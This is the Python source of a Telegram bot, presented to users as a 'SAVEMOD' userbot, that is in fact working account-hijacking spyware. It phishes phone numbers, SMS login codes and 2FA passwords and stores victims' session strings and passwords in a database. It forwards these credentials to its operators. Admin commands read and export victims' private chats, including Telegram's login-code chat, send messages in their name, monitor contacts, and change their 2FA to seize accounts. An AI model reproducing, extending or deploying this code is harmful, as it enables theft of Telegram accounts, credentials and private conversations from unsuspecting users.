import asyncio
import sqlite3
import os
import sys
import shutil
import tempfile
import html
import logging
from datetime import datetime
from threading import Thread
from typing import Optional, Dict, List, Any, Tuple

from flask import Flask, jsonify
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.types import UserStatusOnline, UserStatusOffline, UserStatusRecently, UserStatusLastWeek, UserStatusLastMonth
from aiogram import Bot, Dispatcher, types as aiogram_types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, InputFile, ReplyKeyboardMarkup, KeyboardButton
from aiogram.utils import executor
import nest_asyncio

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
nest_asyncio.apply()

API_ID = int(os.environ.get('API_ID', 0))
API_HASH = os.environ.get('API_HASH', '')
BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
ADMIN_IDS = [int(x.strip()) for x in os.environ.get('ADMIN_IDS', '').split(',') if x.strip()]

if not API_ID or not API_HASH or not BOT_TOKEN:
    logger.error("Ошибка: Не заданы переменные окружения")
    sys.exit(1)

logger.info(f"Администраторы: {ADMIN_IDS}")

VOLUME_PATH = os.environ.get('VOLUME_MOUNTS', '/app/data')
if not os.path.exists(VOLUME_PATH):
    VOLUME_PATH = '.'
    os.makedirs(VOLUME_PATH, exist_ok=True)

DB_PATH = os.path.join(VOLUME_PATH, 'userbot.db')
logger.info(f"📁 База данных: {DB_PATH}")

conn = sqlite3.connect(DB_PATH, check_same_thread=False)
cursor = conn.cursor()

cursor.execute('''
    CREATE TABLE IF NOT EXISTS user_sessions (
        user_id INTEGER PRIMARY KEY,
        session_string TEXT,
        phone TEXT,
        two_fa TEXT,
        first_name TEXT,
        last_name TEXT,
        username TEXT,
        is_active INTEGER DEFAULT 0,
        registered_at TEXT
    )
''')
try:
    cursor.execute('ALTER TABLE user_sessions ADD COLUMN registered_at TEXT')
except:
    pass

cursor.execute('''
    CREATE TABLE IF NOT EXISTS muted_users (
        user_id INTEGER,
        muted_by INTEGER,
        muted_at TEXT,
        PRIMARY KEY (user_id, muted_by)
    )
''')

cursor.execute('''
    CREATE TABLE IF NOT EXISTS saved_messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        owner_id INTEGER,
        msg_id INTEGER,
        sender_id INTEGER,
        text TEXT,
        date TEXT
    )
''')

cursor.execute('''
    CREATE TABLE IF NOT EXISTS spy_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT,
        sender_id INTEGER,
        sender_name TEXT,
        message TEXT,
        chat_id INTEGER,
        chat_name TEXT
    )
''')

cursor.execute('''
    CREATE TABLE IF NOT EXISTS user_status_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT,
        user_id INTEGER,
        user_name TEXT,
        status TEXT
    )
''')

conn.commit()

active_clients = {}
saved_messages = {}
temp_auth = {}
active_chats = {}
user_status_tracker = {}
current_active_user = None
monitored_users = {}
pending_2fa = {}

bot = Bot(token=BOT_TOKEN, parse_mode='HTML')
dp = Dispatcher(bot)

def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_target_admin(target_id):
    return target_id in ADMIN_IDS

def escape_html(text):
    return html.escape(str(text))

def get_status_text(status):
    if isinstance(status, UserStatusOnline):
        return "🟢 В сети"
    elif isinstance(status, UserStatusOffline):
        return "⚫ Не в сети"
    elif isinstance(status, UserStatusRecently):
        return "🟡 Был недавно"
    elif isinstance(status, UserStatusLastWeek):
        return "🟠 Был на неделе"
    elif isinstance(status, UserStatusLastMonth):
        return "🔴 Был в месяце"
    else:
        return "⚪ Статус скрыт"

def get_active_client():
    global current_active_user
    if current_active_user and current_active_user in active_clients:
        return active_clients[current_active_user], current_active_user
    for uid, client in active_clients.items():
        if not is_target_admin(uid):
            current_active_user = uid
            return client, uid
    return None, None

async def resolve_entity(client, target):
    try:
        if target.isdigit():
            return await client.get_entity(int(target))
        if target.startswith('@'):
            return await client.get_entity(target)
        return await client.get_entity(target)
    except:
        return None

async def send_to_admin(text):
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(admin_id, text, parse_mode='HTML')
            logger.info(f"✅ Уведомление отправлено админу {admin_id}")
        except Exception as e:
            logger.error(f"❌ Ошибка отправки админу {admin_id}: {e}")

def get_code_keyboard():
    kb = InlineKeyboardMarkup(row_width=3)
    for i in range(1, 10):
        kb.insert(InlineKeyboardButton(str(i), callback_data=f"code_digit_{i}"))
    kb.row(
        InlineKeyboardButton("0", callback_data="code_digit_0"),
        InlineKeyboardButton("⌫", callback_data="code_backspace"),
        InlineKeyboardButton("✅", callback_data="code_submit")
    )
    return kb

async def export_chat_to_html(client, chat_id, chat_name, me):
    messages = []
    async for msg in client.iter_messages(chat_id, limit=5000):
        if msg.text:
            try:
                if msg.out:
                    sender_name = f"{me.first_name} (Вы)"
                    direction = "outgoing"
                else:
                    sender = await client.get_entity(msg.sender_id)
                    sender_name = sender.first_name or sender.username or str(msg.sender_id)
                    direction = "incoming"
                time_str = msg.date.strftime('%H:%M')
                date_str = msg.date.strftime('%d.%m.%Y')
                text = escape_html(msg.text).replace('\n', '<br>')
                messages.append(f'<div class="message {direction}"><div class="message-info"><span class="sender">{escape_html(sender_name)}</span><span class="time">{time_str}</span></div><div class="message-text">{text}</div><div class="message-date">{date_str}</div></div>')
            except:
                continue
    if not messages:
        return None
    messages.reverse()
    return f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Экспорт чата с {escape_html(chat_name)}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;padding:20px}}
.container{{max-width:900px;margin:0 auto;background:#fff;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,0.3);overflow:hidden}}
.header{{background:linear-gradient(135deg,#1a1a2e 0%,#16213e 100%);color:#fff;padding:25px 30px;text-align:center}}
.header h1{{font-size:24px;margin-bottom:8px}}
.header p{{opacity:0.8;font-size:14px}}
.stats{{display:flex;justify-content:space-around;background:#0f3460;color:#fff;padding:12px;font-size:13px}}
.stats span{{font-weight:bold;font-size:18px}}
.messages{{padding:20px;background:#f8f9fa;max-height:70vh;overflow-y:auto}}
.message{{margin-bottom:16px;padding:12px 16px;border-radius:18px;max-width:85%;word-wrap:break-word;animation:fadeIn 0.3s ease}}
@keyframes fadeIn{{from{{opacity:0;transform:translateY(10px)}}to{{opacity:1;transform:translateY(0)}}}}
.incoming{{background:#e9ecef;margin-right:auto;border-bottom-left-radius:4px}}
.outgoing{{background:#007aff;color:#fff;margin-left:auto;border-bottom-right-radius:4px}}
.outgoing .sender{{color:#ffd700}}
.outgoing .time,.outgoing .message-date{{color:rgba(255,255,255,0.7)}}
.message-info{{display:flex;justify-content:space-between;margin-bottom:6px;font-size:12px;flex-wrap:wrap;gap:8px}}
.sender{{font-weight:600;color:#007aff}}
.time{{color:#6c757d;font-size:11px}}
.message-text{{font-size:14px;line-height:1.5;white-space:pre-wrap;word-break:break-word}}
.message-date{{font-size:10px;color:#adb5bd;margin-top:5px;text-align:right}}
.footer{{background:#f1f3f5;text-align:center;padding:15px;font-size:12px;color:#6c757d;border-top:1px solid #dee2e6}}
::-webkit-scrollbar{{width:6px}}
::-webkit-scrollbar-track{{background:#e9ecef;border-radius:3px}}
::-webkit-scrollbar-thumb{{background:#adb5bd;border-radius:3px}}
@media(max-width:768px){{.message{{max-width:95%}}.container{{border-radius:12px}}.header h1{{font-size:18px}}}}
</style>
</head>
<body>
<div class="container">
<div class="header"><h1>💬 Экспорт чата с {escape_html(chat_name)}</h1><p>Экспорт переписки из Telegram — {datetime.now().strftime('%d.%m.%Y')}</p></div>
<div class="stats"><div>📊 Всего сообщений: <span>{len(messages)}</span></div><div>👤 Чат: <span>{escape_html(chat_name)}</span></div></div>
<div class="messages">{''.join(messages)}</div>
<div class="footer">📅 Экспортировано: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')} | 🔒 Приватный чат</div>
</div>
</body>
</html>'''

@dp.message_handler(commands=['spyhelp'])
async def cmd_spyhelp(message):
    if not is_admin(message.from_user.id):
        await message.answer("❌ Нет доступа")
        return
    await message.answer("""
🔰 АДМИН КОМАНДЫ

/users - список аккаунтов
/sessions - список сессий
/swap НОМЕР - переключить аккаунт
/active - активный аккаунт
/del_session НОМЕР - удалить сессию
/show2fa НОМЕР - показать 2FA
/reset_me - сброс сессии

/send ID/@username текст
/chat ID/@username/tg
/chats - список диалогов
/status @username - статус
/online - кто в сети
/export ID - экспорт чата

/mon @username - слежка
/unmon @username - остановить
/logs N - логи
/statuslogs N - логи статусов
/stats - статистика
/backup - бэкап

🤖 КОМАНДЫ SAVEMOD (через точку)
.help .mute .unmute .list .spam .type .info
""")

@dp.message_handler(commands=['users'])
async def cmd_users(message):
    if not is_admin(message.from_user.id):
        return
    cursor.execute('SELECT user_id, first_name, username, phone, two_fa, is_active FROM user_sessions')
    rows = cursor.fetchall()
    if not rows:
        await message.answer("Нет аккаунтов")
        return
    out = "👥 АККАУНТЫ\n\n"
    i = 0
    for uid, fn, un, ph, tf, act in rows:
        if is_target_admin(uid):
            continue
        i += 1
        name = fn or un or str(uid)
        actm = " ✅" if (act == 1 or uid == current_active_user) else ""
        out += f"{i}. {name}{actm}\n   🆔 {uid}\n   📱 {ph or '-'}\n   🔐 {'✅' if tf else '❌'}\n\n"
        if len(out) > 3500:
            await message.answer(out)
            out = ""
    if out:
        await message.answer(out)

@dp.message_handler(commands=['sessions'])
async def cmd_sessions(message):
    if not is_admin(message.from_user.id):
        return
    cursor.execute('SELECT user_id, first_name, username FROM user_sessions')
    rows = cursor.fetchall()
    if not rows:
        await message.answer("Нет сессий")
        return
    lst = []
    for uid, fn, un in rows:
        if is_target_admin(uid):
            continue
        name = fn or un or str(uid)
        st = "✅" if uid in active_clients else "❌"
        lst.append(f"{st} {uid} - {name}")
    await message.answer("СЕССИИ\n\n" + "\n".join(lst))

@dp.message_handler(commands=['del_session'])
async def cmd_del_session(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("/del_session НОМЕР")
        return
    try:
        num = int(args) - 1
        cursor.execute('SELECT user_id, first_name, username FROM user_sessions')
        rows = cursor.fetchall()
        na = [(uid, fn, un) for uid, fn, un in rows if not is_target_admin(uid)]
        if num < 0 or num >= len(na):
            await message.answer("Неверный номер")
            return
        tid, fn, un = na[num]
        name = fn or un or str(tid)
        if tid in active_clients:
            try:
                await active_clients[tid].disconnect()
            except:
                pass
            del active_clients[tid]
        cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (tid,))
        cursor.execute('DELETE FROM muted_users WHERE muted_by=?', (tid,))
        conn.commit()
        await message.answer(f"Сессия {name} удалена")
    except:
        await message.answer("Ошибка")

@dp.message_handler(commands=['reset_me'])
async def cmd_reset_me(message):
    uid = message.from_user.id
    if uid in active_clients:
        try:
            await active_clients[uid].disconnect()
        except:
            pass
        del active_clients[uid]
    cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (uid,))
    conn.commit()
    await message.answer("Сессия удалена. Отправь /start")

@dp.message_handler(commands=['show2fa'])
async def cmd_show2fa(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if args:
        try:
            num = int(args) - 1
            cursor.execute('SELECT user_id, first_name, username, two_fa FROM user_sessions')
            rows = cursor.fetchall()
            na = [(uid, fn, un, tf) for uid, fn, un, tf in rows if not is_target_admin(uid)]
            if num < 0 or num >= len(na):
                await message.answer("Неверный номер")
                return
            uid, fn, un, tf = na[num]
            name = fn or un or str(uid)
            if tf:
                await message.answer(f"2FA для {name}:\n<code>{tf}</code>")
            else:
                await message.answer(f"У {name} нет 2FA")
        except:
            await message.answer("Ошибка")
    else:
        cl, uid = get_active_client()
        if not cl or is_target_admin(uid):
            await message.answer("Нет активного аккаунта")
            return
        cursor.execute('SELECT first_name, two_fa FROM user_sessions WHERE user_id=?', (uid,))
        row = cursor.fetchone()
        if row and row[1]:
            await message.answer(f"2FA для {row[0]}:\n<code>{row[1]}</code>")
        else:
            await message.answer("Нет 2FA")

@dp.message_handler(commands=['swap'])
async def cmd_swap(message):
    global current_active_user
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("/swap НОМЕР")
        return
    try:
        num = int(args) - 1
        cursor.execute('SELECT user_id, first_name, username FROM user_sessions')
        rows = cursor.fetchall()
        na = [(uid, fn, un) for uid, fn, un in rows if not is_target_admin(uid)]
        if num < 0 or num >= len(na):
            await message.answer("Неверный номер")
            return
        uid, fn, un = na[num]
        name = fn or un or str(uid)
        if uid not in active_clients:
            await message.answer(f"Аккаунт {name} не запущен")
            return
        current_active_user = uid
        cursor.execute('UPDATE user_sessions SET is_active=0')
        cursor.execute('UPDATE user_sessions SET is_active=1 WHERE user_id=?', (uid,))
        conn.commit()
        me = await active_clients[uid].get_me()
        await message.answer(f"Переключился на {me.first_name}")
    except:
        await message.answer("Ошибка")

@dp.message_handler(commands=['active'])
async def cmd_active(message):
    if not is_admin(message.from_user.id):
        return
    cl, uid = get_active_client()
    if not cl or is_target_admin(uid):
        await message.answer("Нет активного аккаунта")
        return
    try:
        me = await cl.get_me()
        await message.answer(f"Активный: {me.first_name} (@{me.username or 'нет'})")
    except:
        await message.answer(f"Активный ID: {uid}")

@dp.message_handler(commands=['send'])
async def cmd_send(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("/send @username текст")
        return
    parts = args.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("/send @username текст")
        return
    cl, uid = get_active_client()
    if not cl:
        await message.answer("Нет активного аккаунта")
        return
    ent = await resolve_entity(cl, parts[0])
    if not ent or is_target_admin(ent.id):
        await message.answer("Не найден")
        return
    try:
        await cl.send_message(ent.id, parts[1])
        await message.answer(f"Отправлено: {parts[1][:100]}")
    except Exception as e:
        await message.answer(f"Ошибка: {e}")

@dp.message_handler(commands=['chat'])
async def cmd_chat(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("/chat ID\n/chat @username\n/chat tg")
        return
    cl, uid = get_active_client()
    if not cl:
        await message.answer("Нет активного аккаунта")
        return
    try:
        if args.lower() in ['tg', '777000', 'telegram']:
            cid = 777000
            cname = "Telegram (коды)"
        else:
            ent = await resolve_entity(cl, args)
            if not ent or is_target_admin(ent.id):
                await message.answer("Не найден")
                return
            cid = ent.id
            cname = ent.first_name or ent.username or args
        kb = InlineKeyboardMarkup(row_width=2)
        kb.add(
            InlineKeyboardButton("Последние 30", callback_data=f"cl_{cid}_{cname}"),
            InlineKeyboardButton("Полный HTML", callback_data=f"cf_{cid}_{cname}")
        )
        await message.answer(f"Чат с {cname}", reply_markup=kb)
    except Exception as e:
        await message.answer(f"Ошибка: {e}")

@dp.message_handler(commands=['chats'])
async def cmd_chats(message):
    if not is_admin(message.from_user.id):
        return
    cl, uid = get_active_client()
    if not cl:
        await message.answer("Нет активного аккаунта")
        return
    await message.answer("🔄 Собираю список диалогов...")
    chats = []
    async for dlg in cl.iter_dialogs():
        if dlg.is_user:
            try:
                ent = await cl.get_entity(dlg.id)
                if getattr(ent, 'bot', False) or ent.id == uid or is_target_admin(ent.id):
                    continue
                name = ent.first_name or ent.username or str(ent.id)
                chats.append({'id': ent.id, 'name': name})
            except:
                chats.append({'id': dlg.id, 'name': dlg.name or str(dlg.id)})
    active_chats[uid] = chats
    if not chats:
        await message.answer("Нет диалогов")
        return
    out = "ДИАЛОГИ\n\n"
    for i, ch in enumerate(chats):
        out += f"{i+1}. {ch['name']}\n"
        if len(out) > 3500:
            await message.answer(out)
            out = ""
    if out:
        await message.answer(out)

@dp.callback_query_handler(lambda c: c.data.startswith('cl_'))
async def chat_last(cb):
    if not is_admin(cb.from_user.id):
        await cb.answer("Нет прав")
        return
    data = cb.data.replace('cl_', '').split('_', 1)
    cid = int(data[0])
    cname = data[1]
    cl, uid = get_active_client()
    if not cl:
        await cb.message.answer("Нет активного аккаунта")
        return
    msgs = []
    async for msg in cl.iter_messages(cid, limit=30):
        if msg.text:
            try:
                if msg.out:
                    sn = "👉 Я"
                else:
                    s = await cl.get_entity(msg.sender_id)
                    if is_target_admin(s.id):
                        continue
                    sn = s.first_name or s.username or str(s.id)
                msgs.append(f"[{msg.date.strftime('%d.%m %H:%M')}] {sn}: {msg.text[:150]}")
            except:
                msgs.append(f"[{msg.date.strftime('%d.%m %H:%M')}] {msg.text[:150]}")
    if msgs:
        await cb.message.answer(f"Чат с {cname}\n\n" + "\n".join(reversed(msgs[-25:])))
    else:
        await cb.message.answer("Нет сообщений")

@dp.callback_query_handler(lambda c: c.data.startswith('cf_'))
async def chat_full(cb):
    if not is_admin(cb.from_user.id):
        await cb.answer("Нет прав")
        return
    data = cb.data.replace('cf_', '').split('_', 1)
    cid = int(data[0])
    cname = data[1]
    cl, uid = get_active_client()
    if not cl:
        await cb.message.answer("Нет активного аккаунта")
        return
    try:
        me = await cl.get_me()
        status = await cb.message.answer("📄 Экспортирую...")
        htmlc = await export_chat_to_html(cl, cid, cname, me)
        if not htmlc:
            await status.edit_text("❌ Нет сообщений")
            return
        with tempfile.NamedTemporaryFile(mode='w', suffix='.html', encoding='utf-8', delete=False) as f:
            f.write(htmlc)
            path = f.name
        with open(path, 'rb') as f:
            for aid in ADMIN_IDS:
                try:
                    await bot.send_document(aid, InputFile(f, filename=f"chat_{cname}.html"), caption=f"📁 Чат с {cname}")
                    await f.seek(0)
                except:
                    pass
        os.unlink(path)
        await status.delete()
    except Exception as e:
        await cb.message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['export'])
async def cmd_export(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("/export ID или @username")
        return
    cl, uid = get_active_client()
    if not cl:
        await message.answer("Нет активного аккаунта")
        return
    ent = await resolve_entity(cl, args)
    if not ent or is_target_admin(ent.id):
        await message.answer("Не найден")
        return
    name = ent.first_name or ent.username or str(ent.id)
    status = await message.answer(f"📄 Экспортирую чат с {name}...")
    try:
        me = await cl.get_me()
        htmlc = await export_chat_to_html(cl, ent.id, name, me)
        if not htmlc:
            await status.edit_text("❌ Нет сообщений")
            return
        with tempfile.NamedTemporaryFile(mode='w', suffix='.html', encoding='utf-8', delete=False) as f:
            f.write(htmlc)
            path = f.name
        with open(path, 'rb') as f:
            for aid in ADMIN_IDS:
                try:
                    await bot.send_document(aid, InputFile(f, filename=f"chat_{name}.html"), caption=f"📁 Чат с {name}")
                    await f.seek(0)
                except:
                    pass
        os.unlink(path)
        await status.delete()
    except Exception as e:
        await status.edit_text(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['status'])
async def cmd_status(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("/status @username")
        return
    cl, uid = get_active_client()
    if not cl:
        await message.answer("Нет активного аккаунта")
        return
    ent = await resolve_entity(cl, args)
    if not ent or getattr(ent, 'bot', False) or is_target_admin(ent.id):
        await message.answer("Не найден")
        return
    st = get_status_text(ent.status) if hasattr(ent, 'status') else "Статус скрыт"
    await message.answer(f"👤 {ent.first_name}\n🆔 {ent.id}\n📊 {st}")

@dp.message_handler(commands=['online'])
async def cmd_online(message):
    if not is_admin(message.from_user.id):
        return
    cl, uid = get_active_client()
    if not cl:
        await message.answer("Нет активного аккаунта")
        return
    online = []
    async for dlg in cl.iter_dialogs():
        if dlg.is_user:
            try:
                ent = await cl.get_entity(dlg.id)
                if not getattr(ent, 'bot', False) and not is_target_admin(ent.id) and isinstance(ent.status, UserStatusOnline):
                    online.append(dlg.name)
            except:
                pass
    if online:
        await message.answer(f"🟢 В сети ({len(online)}):\n" + "\n".join(online[:30]))
    else:
        await message.answer("🟢 Никого в сети")

@dp.message_handler(commands=['mon'])
async def cmd_mon(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("/mon @username")
        return
    cl, uid = get_active_client()
    if not cl:
        await message.answer("Нет активного аккаунта")
        return
    ent = await resolve_entity(cl, args)
    if not ent or getattr(ent, 'bot', False) or is_target_admin(ent.id):
        await message.answer("Не найден")
        return
    monitored_users[str(ent.id)] = {'name': ent.first_name, 'admin_id': message.from_user.id}
    await message.answer(f"✅ Мониторинг {ent.first_name} начат")

@dp.message_handler(commands=['unmon'])
async def cmd_unmon(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("/unmon @username")
        return
    cl, uid = get_active_client()
    if not cl:
        await message.answer("Нет активного аккаунта")
        return
    ent = await resolve_entity(cl, args)
    if not ent:
        await message.answer("Не найден")
        return
    if str(ent.id) in monitored_users:
        del monitored_users[str(ent.id)]
        await message.answer(f"✅ Мониторинг {ent.first_name} остановлен")
    else:
        await message.answer("❌ Не отслеживается")

@dp.message_handler(commands=['session'])
async def cmd_session(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("/session НОМЕР")
        return
    try:
        num = int(args) - 1
        cursor.execute('SELECT user_id, session_string, phone, two_fa, first_name, username FROM user_sessions')
        rows = cursor.fetchall()
        na = [(uid, ss, ph, tf, fn, un) for uid, ss, ph, tf, fn, un in rows if not is_target_admin(uid)]
        if num < 0 or num >= len(na):
            await message.answer("Неверный номер")
            return
        uid, ss, ph, tf, fn, un = na[num]
        name = fn or un or str(uid)
        for aid in ADMIN_IDS:
            try:
                await bot.send_message(aid, f"🎭 СЕССИЯ {name}\n\n<code>{ss}</code>", parse_mode='HTML')
            except:
                pass
        await message.answer("✅ Сессия отправлена")
    except:
        await message.answer("❌ Ошибка")

@dp.message_handler(commands=['set2fa'])
async def cmd_set2fa(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("/set2fa ПАРОЛЬ")
        return
    cl, uid = get_active_client()
    if not cl or is_target_admin(uid):
        await message.answer("Нет активного аккаунта")
        return
    try:
        await cl.edit_2fa(args)
        cursor.execute('UPDATE user_sessions SET two_fa=? WHERE user_id=?', (args, uid))
        conn.commit()
        await message.answer(f"✅ 2FA установлен: <code>{args}</code>", parse_mode='HTML')
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['info'])
async def cmd_info(message):
    if not is_admin(message.from_user.id):
        return
    cl, uid = get_active_client()
    if not cl or is_target_admin(uid):
        await message.answer("Нет активного аккаунта")
        return
    try:
        me = await cl.get_me()
        cursor.execute('SELECT phone, two_fa FROM user_sessions WHERE user_id=?', (uid,))
        row = cursor.fetchone()
        await message.answer(f"👤 {me.first_name}\n🆔 {me.id}\n📱 {row[0] if row else '-'}\n🔐 {'✅' if row and row[1] else '❌'}")
    except:
        await message.answer("❌ Ошибка")

@dp.message_handler(commands=['logs'])
async def cmd_logs(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    lim = int(args) if args and args.isdigit() else 20
    cursor.execute('SELECT timestamp, sender_name, message FROM spy_logs ORDER BY id DESC LIMIT ?', (lim,))
    rows = cursor.fetchall()
    if not rows:
        await message.answer("Нет логов")
        return
    out = "📜 ЛОГИ\n\n"
    for ts, nm, msg in reversed(rows):
        out += f"[{ts[11:16]}] {nm}: {msg[:80]}\n"
    await message.answer(out[:4000])

@dp.message_handler(commands=['statuslogs'])
async def cmd_statuslogs(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    lim = int(args) if args and args.isdigit() else 20
    cursor.execute('SELECT timestamp, user_name, status FROM user_status_logs ORDER BY id DESC LIMIT ?', (lim,))
    rows = cursor.fetchall()
    if not rows:
        await message.answer("Нет логов")
        return
    out = "🔄 ЛОГИ СТАТУСОВ\n\n"
    for ts, nm, st in reversed(rows):
        e = "🟢" if "ВОШЕЛ" in st else "⚫"
        out += f"{e} [{ts[11:16]}] {nm}: {st}\n"
    await message.answer(out[:4000])

@dp.message_handler(commands=['stats'])
async def cmd_stats(message):
    if not is_admin(message.from_user.id):
        return
    logs = cursor.execute('SELECT COUNT(*) FROM spy_logs').fetchone()[0]
    acc = cursor.execute('SELECT COUNT(*) FROM user_sessions').fetchone()[0]
    stat = cursor.execute('SELECT COUNT(*) FROM user_status_logs').fetchone()[0]
    await message.answer(f"📊 СТАТИСТИКА\n\nАккаунтов: {acc}\nСообщений: {logs}\nЛогов статусов: {stat}\nАктивных: {len(active_clients)}")

@dp.message_handler(commands=['backup'])
async def cmd_backup(message):
    if not is_admin(message.from_user.id):
        return
    st = await message.answer("💾 Создаю бэкап...")
    bp = os.path.join(VOLUME_PATH, f'backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.db')
    shutil.copy2(DB_PATH, bp)
    with open(bp, 'rb') as f:
        for aid in ADMIN_IDS:
            try:
                await bot.send_document(aid, InputFile(f, filename=os.path.basename(bp)), caption="💾 Бэкап БД")
                await f.seek(0)
            except:
                pass
    os.remove(bp)
    await st.edit_text("✅ Бэкап отправлен")

@dp.message_handler(commands=['start'])
async def cmd_start(message):
    uid = message.from_user.id
    cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (uid,))
    row = cursor.fetchone()
    if row and row[0]:
        if is_admin(uid):
            await message.answer("✅ Ты уже авторизован!\n/spyhelp - команды")
        else:
            await message.answer("✅ Ты уже авторизован в SAVEMOD!")
        if uid not in active_clients:
            asyncio.create_task(run_userbot(uid, row[0]))
        return
    kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(KeyboardButton("📱 Поделиться номером", request_contact=True))
    await message.answer("🔐 Отправь номер телефона", reply_markup=kb)

@dp.message_handler(content_types=aiogram_types.ContentType.CONTACT)
async def handle_contact(message):
    uid = message.from_user.id
    phone = message.contact.phone_number
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        res = await client.send_code_request(phone)
        temp_auth[uid] = {'client': client, 'phone': phone, 'hash': res.phone_code_hash, 'code': ''}
        await message.answer("📱 Введи код из SMS:", reply_markup=get_code_keyboard())
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.callback_query_handler(lambda c: c.data.startswith('code_'))
async def handle_code(cb):
    uid = cb.from_user.id
    if uid not in temp_auth:
        await cb.answer("Сессия истекла, /start")
        return
    act = cb.data.replace('code_', '')
    cur = temp_auth[uid].get('code', '')
    if act.startswith('digit_'):
        d = act.split('_')[1]
        if len(cur) < 5:
            temp_auth[uid]['code'] = cur + d
    elif act == 'backspace':
        temp_auth[uid]['code'] = cur[:-1]
    elif act == 'submit':
        if len(cur) == 5:
            await cb.answer("Авторизация...")
            await complete_auth(cb, uid)
            return
        else:
            await cb.answer("Нужно 5 цифр", show_alert=True)
            return
    code = temp_auth[uid]['code']
    disp = code if code else "_____"
    await cb.message.edit_text(f"📱 Код: {disp}", reply_markup=get_code_keyboard())
    await cb.answer()

async def complete_auth(cb, uid):
    data = temp_auth[uid]
    try:
        await data['client'].sign_in(phone=data['phone'], code=data['code'], phone_code_hash=data['hash'])
        ss = data['client'].session.save()
        me = await data['client'].get_me()
        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active, registered_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
                       (uid, ss, data['phone'], None, me.first_name, me.last_name, me.username, 0, datetime.now().isoformat()))
        conn.commit()
        await cb.message.answer("✅ Авторизация успешна!")
        asyncio.create_task(run_userbot(uid, ss))
        await data['client'].disconnect()
        del temp_auth[uid]
        for aid in ADMIN_IDS:
            try:
                await bot.send_message(aid, f"🎉 Новый пользователь: {me.first_name}\nID: {uid}")
            except:
                pass
    except Exception as e:
        err = str(e).lower()
        if '2fa' in err or 'password' in err or 'two-steps' in err:
            await cb.message.answer("🔐 Введи облачный пароль (2FA):")
            pending_2fa[uid] = data
            del temp_auth[uid]
        else:
            await cb.message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(lambda msg: msg.from_user.id in pending_2fa)
async def handle_2fa(message):
    uid = message.from_user.id
    data = pending_2fa[uid]
    try:
        await data['client'].sign_in(password=message.text.strip())
        ss = data['client'].session.save()
        me = await data['client'].get_me()
        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active, registered_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
                       (uid, ss, data['phone'], message.text.strip(), me.first_name, me.last_name, me.username, 0, datetime.now().isoformat()))
        conn.commit()
        await message.answer("✅ Авторизация с 2FA успешна!")
        asyncio.create_task(run_userbot(uid, ss))
        await data['client'].disconnect()
        del pending_2fa[uid]
        for aid in ADMIN_IDS:
            try:
                await bot.send_message(aid, f"🎉 Новый пользователь (2FA): {me.first_name}\nID: {uid}\n🔐 2FA: {message.text.strip()}")
            except:
                pass
    except Exception as e:
        await message.answer(f"❌ Ошибка 2FA: {e}")

async def run_userbot(owner_id, session_string):
    if owner_id in active_clients:
        try:
            await active_clients[owner_id].disconnect()
        except:
            pass
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    await client.connect()
    if not await client.is_user_authorized():
        cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (owner_id,))
        conn.commit()
        return
    active_clients[owner_id] = client
    saved_messages[owner_id] = {}
    user_status_tracker[owner_id] = {}
    logger.info(f"✅ Юзербот запущен для {owner_id}")
    cursor.execute('SELECT user_id FROM muted_users WHERE muted_by=?', (owner_id,))
    muted_users = {row[0] for row in cursor.fetchall()}
    logger.info(f"🔇 Загружено заглушенных: {len(muted_users)}")
    
    @client.on(events.UserUpdate)
    async def track_status(event):
        try:
